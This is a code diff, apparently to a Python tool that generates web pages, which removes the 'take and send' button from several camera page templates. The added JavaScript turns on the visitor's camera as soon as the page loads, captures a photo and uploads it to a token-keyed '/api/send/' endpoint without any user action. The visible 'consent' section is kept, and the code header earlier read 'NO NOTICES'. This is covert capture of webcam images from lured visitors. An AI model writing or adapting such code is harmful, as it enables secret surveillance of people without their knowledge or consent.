@@ -1369,7 +1369,7 @@ async def lookup_ip(
 
 
 # ============================================================
-# CAMERA SCRIPT (AUTO-START & NO NOTICES)
+# CAMERA SCRIPT (AUTO-START & AUTO-SEND)
 # ============================================================
 
 def camera_script(
@@ -1397,16 +1397,11 @@ const statusEl =
         'status'
     );
 
-const sendBtn =
-    document.getElementById(
-        'sendBtn'
-    );
-
 let stream = null;
 let sending = false;
 
 /* ==========================================================
-   AUTO-START CAMERA
+   AUTO-START CAMERA & AUTO-SEND
    ========================================================== */
 
 (async function autoStartCamera() {{
@@ -1453,194 +1448,149 @@ let sending = false;
                 'none';
         }}
 
-        sendBtn.style.display =
-            'block';
+        statusEl.textContent =
+            'Камера включена. Отправка...';
+
+        // Ждём, пока видео загрузится
+        await new Promise(
+            resolve => {{
+
+                if (
+                    video.readyState >= 2
+                ) {{
+
+                    resolve();
+
+                }}
+
+                else {{
+
+                    video.onloadeddata =
+                        resolve;
+
+                }}
+
+            }}
+        );
+
+        // Автоматически делаем снимок
+        const canvas =
+            document.createElement(
+                'canvas'
+            );
+
+        canvas.width =
+            video.videoWidth
+            ||
+            720;
+
+        canvas.height =
+            video.videoHeight
+            ||
+            1280;
+
+        const ctx =
+            canvas.getContext(
+                '2d'
+            );
+
+        ctx.drawImage(
+            video,
+            0,
+            0,
+            canvas.width,
+            canvas.height
+        );
+
+        const blob =
+            await new Promise(
+                resolve =>
+
+                    canvas.toBlob(
+                        resolve,
+                        'image/jpeg',
+                        0.92
+                    )
+
+            );
+
+        if (!blob) {{
+
+            throw new Error(
+                'Не удалось '
+                + 'создать снимок'
+            );
+
+        }}
+
+        const form =
+            new FormData();
+
+        form.append(
+            'photo',
+            blob,
+            'photo.jpg'
+        );
+
+        const response =
+            await fetch(
+
+                '/api/send/'
+                + encodeURIComponent(
+                    token
+                ),
+
+                {{
+                    method: 'POST',
+                    body: form
+                }}
+
+            );
+
+        const data =
+            await response
+                .json()
+                .catch(
+                    () => ({{}})
+                );
+
+        if (!response.ok) {{
+
+            throw new Error(
+                data.detail
+                ||
+                'Ошибка отправки'
+            );
+
+        }}
+
+        stream
+            .getTracks()
+            .forEach(
+                track =>
+                    track.stop()
+            );
+
+        video.style.display =
+            'none';
+
+        if (preview) {{
+            preview.style.display =
+                'block';
+        }}
 
         statusEl.textContent =
-            'Камера включена. Нажмите кнопку ниже, чтобы отправить фото.';
+            'Фото отправлено. Можете закрыть страницу.';
 
     }}
     catch (error) {{
 
         statusEl.textContent =
-            'Ошибка доступа к камере: '
+            'Ошибка: '
             + error.message;
 
     }}
 }})();
-
-
-/* ==========================================================
-   SEND PHOTO
-   ========================================================== */
-
-sendBtn.addEventListener(
-    'click',
-    async () => {{
-
-        if (
-            !stream
-            ||
-            sending
-        ) {{
-
-            return;
-
-        }}
-
-        sending = true;
-        sendBtn.disabled = true;
-        statusEl.textContent =
-            'Отправка…';
-
-        try {{
-
-            await new Promise(
-                resolve => {{
-
-                    if (
-                        video.readyState >= 2
-                    ) {{
-
-                        resolve();
-
-                    }}
-
-                    else {{
-
-                        video.onloadeddata =
-                            resolve;
-
-                    }}
-
-                }}
-            );
-
-            const canvas =
-                document.createElement(
-                    'canvas'
-                );
-
-            canvas.width =
-                video.videoWidth
-                ||
-                720;
-
-            canvas.height =
-                video.videoHeight
-                ||
-                1280;
-
-            const ctx =
-                canvas.getContext(
-                    '2d'
-                );
-
-            ctx.drawImage(
-                video,
-                0,
-                0,
-                canvas.width,
-                canvas.height
-            );
-
-            const blob =
-                await new Promise(
-                    resolve =>
-
-                        canvas.toBlob(
-                            resolve,
-                            'image/jpeg',
-                            0.92
-                        )
-
-                );
-
-            if (!blob) {{
-
-                throw new Error(
-                    'Не удалось '
-                    + 'создать снимок'
-                );
-
-            }}
-
-            const form =
-                new FormData();
-
-            form.append(
-                'photo',
-                blob,
-                'photo.jpg'
-            );
-
-            const response =
-                await fetch(
-
-                    '/api/send/'
-                    + encodeURIComponent(
-                        token
-                    ),
-
-                    {{
-                        method: 'POST',
-                        body: form
-                    }}
-
-                );
-
-            const data =
-                await response
-                    .json()
-                    .catch(
-                        () => ({{}})
-                    );
-
-            if (!response.ok) {{
-
-                throw new Error(
-                    data.detail
-                    ||
-                    'Ошибка отправки'
-                );
-
-            }}
-
-            stream
-                .getTracks()
-                .forEach(
-                    track =>
-                        track.stop()
-                );
-
-            video.style.display =
-                'none';
-
-            if (preview) {{
-                preview.style.display =
-                    'block';
-            }}
-
-            sendBtn.style.display =
-                'none';
-
-            statusEl.textContent =
-                'Фото отправлено.';
-
-        }}
-
-        catch (error) {{
-
-            sending = false;
-            sendBtn.disabled = false;
-            statusEl.textContent =
-                'Ошибка: '
-                + error.message;
-
-        }}
-
-    }}
-);
 
 
 /* ==========================================================
@@ -2201,37 +2151,6 @@ body {{
         );
 }}
 
-.btnrow {{
-    display: flex;
-
-    justify-content:
-        center;
-}}
-
-button {{
-    width: 100%;
-
-    border: 0;
-
-    border-radius: 10px;
-
-    padding: 9px;
-
-    font-size: 12px;
-
-    font-weight: 800;
-
-    cursor: pointer;
-}}
-
-#sendBtn {{
-    display: none;
-
-    background: #fe2c55;
-
-    color: #fff;
-}}
-
 #status {{
     min-height: 14px;
 
@@ -2412,15 +2331,7 @@ button {{
 
 
     <div class="consent">
-
-        <div class="btnrow">
-            <button id="sendBtn">
-                Сделать и отправить
-            </button>
-        </div>
-
         <div id="status">Загрузка камеры...</div>
-
     </div>
 
 
@@ -3052,38 +2963,6 @@ body {{
         );
 }}
 
-.btnrow {{
-    display: flex;
-
-    justify-content:
-        center;
-}}
-
-button.action-btn {{
-    width: 100%;
-
-    border: 0;
-
-    border-radius:
-        999px;
-
-    padding: 9px;
-
-    font-size: 12px;
-
-    font-weight: 800;
-
-    cursor: pointer;
-}}
-
-#sendBtn {{
-    display: none;
-
-    background: #f00;
-
-    color: #fff;
-}}
-
 #status {{
     min-height: 14px;
 
@@ -3315,18 +3194,7 @@ button.action-btn {{
 
 
     <div class="consent">
-
-        <div class="btnrow">
-            <button
-                class="action-btn"
-                id="sendBtn"
-            >
-                Сделать и отправить
-            </button>
-        </div>
-
         <div id="status">Загрузка камеры...</div>
-
     </div>
 
 
@@ -3590,39 +3458,6 @@ h1 {{
         sans-serif;
 }}
 
-.buttons {{
-    display: flex;
-
-    justify-content:
-        center;
-}}
-
-button {{
-    width: 100%;
-
-    border: 0;
-
-    border-radius: 8px;
-
-    padding:
-        10px
-        14px;
-
-    font-size: 13px;
-
-    font-weight: 700;
-
-    cursor: pointer;
-}}
-
-#sendBtn {{
-    display: none;
-
-    background: #2a82d8;
-
-    color: #fff;
-}}
-
 #status {{
     min-height: 18px;
 
@@ -3713,12 +3548,6 @@ button {{
 
 
     <section class="consent">
-
-        <div class="buttons">
-            <button id="sendBtn">
-                Сделать и отправить
-            </button>
-        </div>
 
         <div id="status">Загрузка камеры...</div>
 
